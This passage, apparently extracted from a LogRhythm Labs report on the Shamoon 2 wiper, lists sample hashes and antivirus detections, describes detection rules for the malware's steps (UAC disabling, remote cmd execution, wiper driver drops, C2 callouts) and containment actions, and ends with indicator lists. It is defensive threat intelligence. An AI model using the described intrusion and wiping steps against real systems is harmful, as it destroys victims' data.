(bytes):|717312||||\n|MD5:|8fbe990c2d493f58a2afa2b746e49c86||||\n|SHA256:|47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34||||\n|File Type:|PE32+ executable for MS Windows (console) Mono/.Net assembly||||\n|Compile Time:|2009-02-15 12:32:19 UTC||||\n|AV Detection Analysis:|Engine|Signature|Version|Update|\n||Avira|None|8.3.3.4|20170108|\n||ClamAV|Win.Dropper.DistTrack-8|0.99.2.0|20170109|\n||ESET-NOD32|Win64/DistTrack.C|14736|20170108|\n||F-Secure|Worm.Generic.898650|11.0.19100.45|20170109|\n||Kaspersky|HEUR:Trojan.Win32.Generic|15.0.1.13|20170109|\n||McAfee|DistTrack!raw|6.0.6.653|20170108|\n||Microsoft|Trojan:Win32/Depriz.C!dha|1.1.13303.0|20170109|\n||Sophos|Troj/Agent-AUMG|4.98.0|20170109|\n||Symantec|Not Detected|||\n||Trend Micro|Not Detected|||\n\n\n-----\n\n###### Sample: c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\n\n**File Metadata**\n\nFile Name: c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\n\nFile Size (bytes): 327680\n\nMD5: c843046e54b755ec63ccb09d0a689674\n\nSHA256: c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\n\nFile Type: PE32+ executable for MS Windows (console) Mono/.Net assembly\n\nCompile Time: 2009-02-15 12:30:41 UTC\n\nAV Detection Analysis: **Engine** **Signature** **Version**\n\nAvira None 8.3.3.4\n\nClamAV Win.Trojan.DistTrack-6 0.99.2.0\n\nESET-NOD32 Win64/DistTrack.B 14549\n\nF-Secure Trojan.Generic.19781149 11.0.19100.45\n\nKaspersky HEUR:Trojan.Win32.Generic 15.0.1.13\n\nMcAfee RDN/Generic.dx 6.0.6.653\n\nMicrosoft Trojan:Win32/Depriz.C!dha 1.1.13303.0\n\nSophos Troj/Agent-AUMG 4.98.0\n\nSymantec W32.Disttrack.B 20151.1.1.4\n\nTrend Micro Not Detected\n\nTable 8: Sample Metadata\n\n###### Sample: 5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a\n\n**File Metadata**\n\nFile Name: 5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a\n\nFile Size (bytes): 31632\n\nMD5: 76c643ab29d497317085e5db8c799960\n\nSHA256: 5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a\n\nFile Type: PE32+ executable for MS Windows (native) Mono/.Net assembly\n\nCompile Time: 2011-12-28 16:51:29 UTC\n\nAV Detection Analysis: **Engine** **Signature** **Version**\n\nAvira None 8.3.3.4\n\nClamAV None 0.99.2.0\n\nESET-NOD32 None 14755\n\nF-Secure None 11.0.19100.45\n\nKaspersky RiskTool.Win64.RawAccess.a 15.0.1.13\n\nMcAfee DistTrack!sys 6.0.6.653\n\nMicrosoft None 1.1.13407.0\n\nSophos RawDisk Driver (PUA) 4.98.0\n\nSymantec None None\n\nTrend Micro Not Detected\n\nTable 9: Sample Metadata\n\n|Sample: c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|File Metadata|||||\n|File Name:|c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a||||\n|File Size (bytes):|327680||||\n|MD5:|c843046e54b755ec63ccb09d0a689674||||\n|SHA256:|c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a||||\n|File Type:|PE32+ executable for MS Windows (console) Mono/.Net assembly||||\n|Compile Time:|2009-02-15 12:30:41 UTC||||\n|AV Detection Analysis:|Engine|Signature|Version|Update|\n||Avira|None|8.3.3.4|20161204|\n||ClamAV|Win.Trojan.DistTrack-6|0.99.2.0|20161204|\n||ESET-NOD32|Win64/DistTrack.B|14549|20161204|\n||F-Secure|Trojan.Generic.19781149|11.0.19100.45|20161204|\n||Kaspersky|HEUR:Trojan.Win32.Generic|15.0.1.13|20161204|\n||McAfee|RDN/Generic.dx|6.0.6.653|20161204|\n||Microsoft|Trojan:Win32/Depriz.C!dha|1.1.13303.0|20161204|\n||Sophos|Troj/Agent-AUMG|4.98.0|20161204|\n||Symantec|W32.Disttrack.B|20151.1.1.4|20161204|\n||Trend Micro|Not Detected|||\n\n|Sample: 5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|File Metadata|||||\n|File Name:|5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a||||\n|File Size (bytes):|31632||||\n|MD5:|76c643ab29d497317085e5db8c799960||||\n|SHA256:|5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a||||\n|File Type:|PE32+ executable for MS Windows (native) Mono/.Net assembly||||\n|Compile Time:|2011-12-28 16:51:29 UTC||||\n|AV Detection Analysis:|Engine|Signature|Version|Update|\n||Avira|None|8.3.3.4|20170111|\n||ClamAV|None|0.99.2.0|20170112|\n||ESET-NOD32|None|14755|20170112|\n||F-Secure|None|11.0.19100.45|20170112|\n||Kaspersky|RiskTool.Win64.RawAccess.a|15.0.1.13|20170112|\n||McAfee|DistTrack!sys|6.0.6.653|20170108|\n||Microsoft|None|1.1.13407.0|20170112|\n||Sophos|RawDisk Driver (PUA)|4.98.0|20170112|\n||Symantec|None|None|20170111|\n||Trend Micro|Not Detected|||\n\n\n-----\n\n###### Sample: e4b2d326f9c47eb1d79aa59381f8c93b50dc6c0c427eff8a330c49d2beed6d3a\n\n**File Metadata**\n\nFile Name: e4b2d326f9c47eb1d79aa59381f8c93b50dc6c0c427eff8a330c49d2beed6d3a\n\nFile Size (bytes): 759584\n\nMD5: 647e8fd30fa6f9a6a2e2819daa68143c\n\nSHA256: e4b2d326f9c47eb1d79aa59381f8c93b50dc6c0c427eff8a330c49d2beed6d3a\n\nFile Type: PE32 executable for MS Windows (GUI) Intel 80386 32-bit Mono/.Net assembly\n\nCompile Time: 2017-01-10 17:41:03 UTC\n\nAV Detection Analysis: **Engine** **Signature** **Version**\n\nAvira TR/Dropper.MSIL.rawxm 8.3.3.4\n\nClamAV None 0.99.2.0\n\nESET-NOD32 Variant of MSIL/Injector.RBR 14752\n\nF-Secure Trojan.Generic.20270214 11.0.19100.45\n\nKaspersky None 15.0.1.13\n\nMcAfee Artemis!647E8FD30FA6 6.0.6.653\n\nMicrosoft None 1.1.13407.0\n\nSophos Mal/Generic-S 4.98.0\n\nSymantec None None\n\nTrend Micro Not Detected\n\nTable 10: Sample Metadata\n\n|Sample: e4b2d326f9c47eb1d79aa59381f8c93b50dc6c0c427eff8a330c49d2beed6d3a|Col2|Col3|Col4|Col5|\n|---|---|---|---|---|\n|File Metadata|||||\n|File Name:|e4b2d326f9c47eb1d79aa59381f8c93b50dc6c0c427eff8a330c49d2beed6d3a||||\n|File Size (bytes):|759584||||\n|MD5:|647e8fd30fa6f9a6a2e2819daa68143c||||\n|SHA256:|e4b2d326f9c47eb1d79aa59381f8c93b50dc6c0c427eff8a330c49d2beed6d3a||||\n|File Type:|PE32 executable for MS Windows (GUI) Intel 80386 32-bit Mono/.Net assembly||||\n|Compile Time:|2017-01-10 17:41:03 UTC||||\n|AV Detection Analysis:|Engine|Signature|Version|Update|\n||Avira|TR/Dropper.MSIL.rawxm|8.3.3.4|20170111|\n||ClamAV|None|0.99.2.0|20170111|\n||ESET-NOD32|Variant of MSIL/Injector.RBR|14752|20170111|\n||F-Secure|Trojan.Generic.20270214|11.0.19100.45|20170111|\n||Kaspersky|None|15.0.1.13|20170111|\n||McAfee|Artemis!647E8FD30FA6|6.0.6.653|20170108|\n||Microsoft|None|1.1.13407.0|20170111|\n||Sophos|Mal/Generic-S|4.98.0|20170111|\n||Symantec|None|None|20170111|\n||Trend Micro|Not Detected|||\n\n\n-----\n\n## Appendix B:  LogRhythm Detection Rules\n\n\n## Appendix B:  LogRhythm Detection Rules\n\n\n-----\n\n#### Appendix B:  LogRhythm Detection Rules\n\n###### Description\nThe following appendix contains LogRhythm AI Engine\nDetection rules applicable to known Shamoon malware\nsamples obtained.\n\n##### LogRhythm AI Engine Rules\n\n###### Pre-Dropper AI Engine Rule\nThe Pre-Dropper : SMB Connection, Admin Access, and File\nDrop AI Engine rule is a three-block rule triggering upon\nan SMB connection, followed by a confirmed read access\nto the the C:\\Windows\\System32\\csrss.exe file, followed\nby the creation of an executable within the C:\\Windows\\\nSystem32 directory. There is the possibility for this series\nof actions to be a false positive, but this chance is to be\nconsidered relatively rare. See Figure 1.\n\nFigure 1: Pre-Dropper : SMB Connection, Admin Access, File Drop\n\n\n###### Dropper AI Engine Rules\nThe AI Engine Dropper : Disabled UAC Registry rule is a\ngeneric rule that does not inherently identify the presence\nof Shamoon, but it does alert the analyst of the highly\nsuspicious event of a user disabling the User Access Control\ncontrols. Disabling this control allows administrative actions\nto be performed on the system without prompting the user.\nShamoon requires that UAC be disabled to continue with the\ninstallation of the Reporting and Wiping components. See\nFigure 2.\n\nFigure 2: Dropper : Disabled UAC Registry\n\n\n-----\n\nThe Dropper : Remote cmd.exe execution AI Engine rule\nis designed to trigger upon the specific Shamoon cmd.exe\nexecution command used to initiate the installation of\nShamoon on remote systems within the network. This AI\nEngine rule requires that LogRhythm has the capability to\ningest command execution log sources that will be used to\ntrigger this alarm. Within the Windows architecture, the log\nsource ‘MS Event Log for Win7/Win8/2008/2012 – Sysmon’\ncan be used to identify this type of activity as well as\nseveral commercial endpoint security agents. It is unlikely\nthis rule will trigger false positive alerts. See Figure 3.\n\nFigure 3: Dropper : Remote cmd.exe execution\n\n\nThe Dropper : Scheduled Task Creation AI Engine rule again\ndoes not directly imply a Shamoon infection; however, it\ndoes alert upon the highly suspicious action of local system\nscheduled task creation. Should a scheduled task be created\nupon a system, the system administrator for the system\nneeds to be contacted to ensure it is not a false positive.\nShamoon creates a scheduled task to initiate wiping of\nthe system. The default execution time for this task is\nhardcoded in the binary, although the value can be updated\nby the C2 node after successful communication. This rule\ncould trigger false positive alerts. See Figure 4.\n\nFigure 4: Dropper : Scheduled Task Creation\n\nThe Dropper : Service Modification AI Engine rule triggers\nupon the successful modification of the LanmanWorkstation\nservice’s “DependOnService” value. Upon infection with\nShamoon, the malware appends the malicious service (e.g.\nNtsSrv) to the “DependOnService” value. It is unlikely this\nrule will trigger a false positive alert. See Figure 5.\n\nFigure 5: Dropper : Service Modification\n\n\n-----\n\nThe Dropper : Wiper File Drop AI Engine rule triggers upon\nthe presence of any of the following system drivers being\ncreated within the C:\\Windows\\System32\\Drivers directory:\nelrawdisk.sys, drdisk.sys, or vdsk911.sys. While it is possible\nthat future iterations of Shamoon may not use these same\ndriver names, these are the only values that are currently\nknown to exist both within previous reporting as well as\nwithin in-house malware analysis. It is not likely this rule will\ntrigger false positive alerts. See Figure 6.\n\nFigure 6: Dropper : Wiper File Drop\n\nThe Dropper : Confirmation AI Engine rule is a catch-all\nrule that is used to rule out false-positive rules. This rule\nrequires at least three of the Dropper family Shamoon rules\nto be triggered before the Confirmation rule is triggered.\nThis rule has many beneficial capabilities for active defense\nresponse measures to be taken in response to a Shamoon\ninfection and potentially has the capability to protect\nthe network at large from a wide scale exposure to a\nShamoon infection. For additional information on potential\nLogRhythm SmartResponse™ actions, continue to the\nfollowing section. See Figure 7.\n\n\nFigure 7: Dropper : ConfirmationC2 Reporting AI Engine Rules\n\n###### C2 Reporting AI Engine Rules\nThe Reporter : User-Agent String C2 Request AI Engine\nrule is designed to trigger upon detection of the known\nShamoon C2 callout signature. This callout will be directed\nto an external C2 node from the compromised internal\nsystem. Detection of this C2 callout should not generate\nany known false positive alerts. See Figure 8.\n\nFigure 8: Reporter : User-Agent String C2 Request\n\n\n-----\n\nThe Reporter : C2 File Preparation AI Engine rule is designed\nto detect the creation or modification of the file C:\\Windows\\\nSystem32\\netinit.exe. This file is the component of the\nmalware responsible for communications with the C2 node.\nThis file is decrypted from the PKCS7 resource in the dropper\nbinary. It is unlikely this rule will trigger a false positive alert.\nSee Figure 9.\n\nFigure 9: Reporter : C2 File Preparation\n\nThe Reporter : C2 Response, File Creation AI Engine rule\nis designed to trigger upon the successful creation of a file\nwithin the C:\\Temp\\Temp\\filer or C:\\Users\\<user>\\AppData\\\nLocal\\Temp directories. Shamoon uses these locations to\nwrite timestamp information and additional downloads. This\nrule is likely to trigger a false positive alerts due to the high\nusage of the user’s %Temp% directory. See Figure 10.\n\n\nFigure 10: Reporter : C2 Response, File Creation\n\n###### Wiper-Specific AI Engine Rule\nThe Wiper : Timestamp File Creation AI Engine rule is\nthe final Shamoon rule available to be detected before\nthe wiper service begins the wiping process. This rule\nis designed to detect the creation of the timestamp file\ncontaining the updated time at which the wiping process\nshould begin. This rule is not likely to generate false\npositive alerts. See Figure 11.\n\nFigure 11: Wiper : Timestamp File Creation\n\n\n-----\n\n#### LogRhythm SmartResponse Plug-ins\n\nSmartResponse™ plug-ins allow LogRhythm-triggered alarms to initiate a subsequent action. Within the context of this\nreport, the following SmartResponse plug-ins are paired with the alarm: ‘Dropper : Confirmation’. The AI Engine rule\n‘Dropper: Confirmation’ was selected as the rule to pair these SmartResponses, as it signifies the earliest point in which\nthe Shamoon 2.0 infection can truly be confirmed with the lowest levels of false positive events occurring. This is not the\nonly point a LogRhythm SmartResponse can be used to mitigate Shamoon 2 activities, but it represents LogRhythm’s\nrecommended actions for this type of event.\n\n###### Disable AD Account\nThe Disable AD Account SmartResponse plug-in is designed to remove Active Directory domain access for the compromised\nuser account that is being used to propagate the Shamoon infection. This action has the desired impact of isolating\nthe infected system from any other system to which that user may have access. This SmartResponse plug-in does not\nrepresent a 100% effective method of halting the Shamoon malware from moving through the environment, but it does\npose an effective solution.\n\nFigure 12: Disable AD Account: Using Domain Administrator Credentials\n\n\n-----\n\n###### Disable Local System Account\nThe Disable Local System Account SmartResponse plug-in is designed to remove the local user account which is being used\nto propagate the Shamoon infection from other systems with the same local system account. This action has the desired\nimpact of isolating the infected system from any other system on which that user may have access from the same local\nuser account. This SmartResponse plug-in does not represent a 100% effective method of halting the Shamoon malware\nfrom moving through the environment, but it does pose an effective solution.\n\nFigure 13: Disable Local System Account: Using Administrator Credentials\n\n\n-----\n\n###### Quarantine by IP Address – Cisco Specific\nThe Quarantine by IP Address SmartResponse plug-in is a Cisco-specific plug-in that will place the infected Shamoon system\nin quarantine, preventing any inbound or outbound communications from that system from affecting any other network or\nexternal system. This SmartResponse plug-in will not prevent Shamoon from wiping the infected system, but it will protect the\nany surrounding or vulnerable systems from being infected.\n\nFigure 14: Quarantine System by IP Address: Cisco Specific\n\n\n-----\n\n###### Quarantine by IP Address – Palo Alto Networks Specific\nThe Quarantine by IP Address SmartResponse plug-in is a Palo Alto Networks-specific plug-in that will place the infected\nShamoon system in quarantine, preventing any inbound or outbound communications from that system from affecting any\nother network or external system. This SmartResponse plug-in will not prevent Shamoon from wiping the infected system,\nbut it will protect the any surrounding or vulnerable systems from being infected.\n\nFigure 15: Quarantine System by IP Address into Groups: Palo Alto Networks Specific\n\n\n-----\n\n## Appendix C: Indicators of Compromise (IOCs)\n\n\n## Appendix C: Indicators of Compromise (IOCs)\n\n\n-----\n\n##### Appendix C: Consolidated Indicator List\n\n###### Description\n\nThe following appendix contains consolidated IOC information.\n\n394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\n\n61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842\n\n128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd\n\n4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6\n\n448ad1bc06ea26f4709159f72ed70ca199ff2176182619afa03435d38cd53237\n\n47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\n\nc7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\n\n5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a\n\ne4b2d326f9c47eb1d79aa59381f8c93b50dc6c0c427eff8a330c49d2beed6d3a\n\n47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\n\n394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\n\n772ceedbc2cacf7b16ae967de310350e42aa47e5cef19f4423220d41501d86a5\n\n61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842\n\nc7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\n\n128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd\n\n5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a\n\n4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6\n\n010d4517c81bcdc438cb36fdf612274498d08db19bba174462ecbede7d9ce6bb\n\nefd2f4c3fe4e9f2c9ac680a9c670cca378cef6b8776f2362ed278317bfb1fca8\n\n113525c6bea55fa2a2c6cf406184092d743f9d099535923a12cdd9b9192009c4\n\nd56dbe26887a4bef9b2c8f0d05f4502b80083e62ba3c7299c02e01b9eefeb2e4\n\ndbdea08e7b970d395236b8e0aada6fc07fb23e6181485d86f65da1e73ab2ba2e\n\n9979678be7b89a9f01c2481ea6f420417e67572f52aad66ae4ccce3c65a7b504\n\n57fb0ec1eb292956a8d5031d6c2d1369acf5745b94a776aa6957e701003078d6\n\n0752f86b7c1c2b053b3eb4f1b60c046bb114af56882f512b657728f14749cbc9\n\n\n7b589d45825c096d42bdf341193d3fd8fd9a0bd612a6ebd7466c26a753304df9\n\n052f0eb5986e92afc5460eafec293f805851cf2a98bdd2d2aed97eec6c7946a9\n\n01e860972e621c1bd6c990d1817ebc0309dd9298f0e0819cc14d2ffcaa1820e7\n\n25a3497d69604baf4be4d80b6824c06f1b7120144f98eeb0a13d57d6f72eb8e9\n\naf0ae0fa877f921d198239b7c722e12d14b2aa32fdfadaa37b47f558ae366de9\n\n218fac3d0639c0d762fcf71685bcf6b64c33d1533df03b4cf223d9b07ca1e3c2\n\n97943739ccf8a00036dd3cdd0ba48e17a82ab9b65cc22c17c6e6258e72bb9ade\n\nc7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\n\nf1710c802ce590bc737eda6d1845f390a7e7d2cf43313c3362768c5f9f94a807\n\n66d24a529308d8ab7b27ddd43a6c2db84107b831257efb664044ec4437f9487b\n\n62aabce7a5741a9270cddac49cd1d715305c1d0505e620bbeaec6ff9b6fd0260\n\n5469facc266d5582bd387d69032a91c8fff373213b66a2f0852666e72bcdc1da\n\n66fdb7e7d868346e730113ccb9977ca840c4c337434b5fe517f7b1a858fd8317\n\n2bab3716a1f19879ca2e6d98c518debb107e0ed8e1534241f7769193807aac83\n\n7c7ff63898d59522bed1e4f0f7bd43a92a3167d66593628e040e36f90bfb2e5d\n\nc7f937375e8b21dca10ea125e644133de3afc7766a8ca4fc8376470277832d95\n\n6c195ea18c05bbf091f09873ed9cd533ec7c8de7a831b85690e48290b579634b\n\n5a2f540018ca7c012a5d674bd929a0f38bf458043d4eeade1e2cdef94aab5eb8\n\n47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\n\n528714aaaa4a083e72599c32c18aa146db503eee80da236b20aea11aa43bdf62\n\ne5b643cb6ec30d0d0b458e3f2800609f260a5f15c4ac66faf4ebf384f7976df6\n\n7d544878dba1153791542b4212aaf76f897367bd21e7f26f070b1066acd5b810\n\n6b28a43eda5b6f828a65574e3f08a6d00e0acf84cbb94aac5cec5cd448a4649d\n\n7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c\n\n319a001d09ee9d754e8789116bbb21a3c624c999dae9cf83fde90a3fbe67ee6c\n\n\n##### Filenames\n\nntssrvr32.exe\n\ndrdisk.sys\n\ncaclsrv.exe\n\ndvdquery.exe\n\nmsinit.exe\n\nsigver.exe\n\nwcscript.exe\n\nclean.exe\n\nevent.exe\n\nntfrsutil.exe\n\nrouteman.exe\n\nntnw.exe\n\ncertutl.exe\n\nfindfile.exe\n\nntdsutl.exe\n\nrrasrv.exe\n\nnetx.exe\n\nctrl.exe\n\ngpget.exe\n\npower.exe\n\nsacses.exe\n\nfsutl.exe\n\n\ncaiaw00f.exe\n\nnewtvsc.exe\n\ncv.doc\n\ncv_itworx.doc\n\ncv_mci.doc\n\ndiscount_voucher_codes.xlsm\n\nHealth_insurance_plan.doc\n\nHealth_insurance_registration.doc\n\njob_titles.doc\n\njob_titles_itworx.doc\n\njob_titles_mci.doc\n\nPassword_Policy.xlsm\n\nccd\n\nccd6.exe\n\nssc\n\ntss.ps1\n\nTmp9932u1.bat\n\nTmp765643.txt\n\ndp.ps1\n\nccd61.ps1\n\ndp.ps1\n\n\ndfrag.exe\n\nipsecure.exe\n\nrdsadmin.exe\n\nsfmsc.exe\n\nextract.exe\n\ndnslookup.exe\n\niissrv.exe\n\nregsys.exe\n\nsmbinit.exe\n\nntertmgr32.exe\n\nntertmgr64.exe\n\nvdsk911.sys\n\ndcT21x400i.pnf\n\nvsfnp7_6.pnf\n\ncaiaw00e.exe\n\nsbuvideo.exe\n\ncaiaw00i.exe\n\nolvume.exe\n\nusinwb2.exe\n\nbriaw005.exe\n\nfpwwlwf.exe\n\nepiaw003.exe\n\n\nbriaw002.exe\n\nolvsnap.exe\n\ndmwaudio.exe\n\nbriaw006.exe\n\nmiWApRpl.exe\n\ncaiaw00b.exe\n\nlxiaw003.exe\n\npdwmtphw.exe\n\ncaiaw00a.exe\n\nsdwprint.exe\n\ncaiaw00d.exe\n\nkyiaw002.exe\n\nsdwscdrv.exe\n\nbriaw00a.exe\n\nsaiaw002.exe\n\n_mvscdsc.exe\n\nhdvmp32.exe\n\n_s3wcap32.exe\n\nhpiaw001.exe\n\nlxiaw004.exe\n\ncniaw001.exe\n\nlxiaw006.exe\n\n\n-----\n\n-----\n\n##### Contact us:\n**1-866-384-0713**\n**info@logrhythm.com | www.logrhythm.com**\n**Worldwide HQ, 4780 Pearl East Circle, Boulder CO, 80301**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://gallery.logrhythm.com/threat-intelligence-reports/shamoon-2-malware-analysis-logrhythm-labs-threat-intelligence-report.pdf"
    ],
    "report_names": [
        "shamoon-2-malware-analysis-logrhythm-labs-threat-intelligence-report.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1669205065,
    "ts_updated_at": 1743041134,
    "ts_creation_date": 1491929423,
    "ts_modification_date": 1491929426,
    "files": {
        "pdf": "https://archive.orkl.eu/62aaf9f7ec39f6d8f5df14070132137f11fb74b9.pdf",
        "text": "https://archive.orkl.eu/62aaf9f7ec39f6d8f5df14070132137f11fb74b9.txt",
        "img": "https://archive.orkl.eu/62aaf9f7ec39f6d8f5df14070132137f11fb74b9.jpg"
    }
}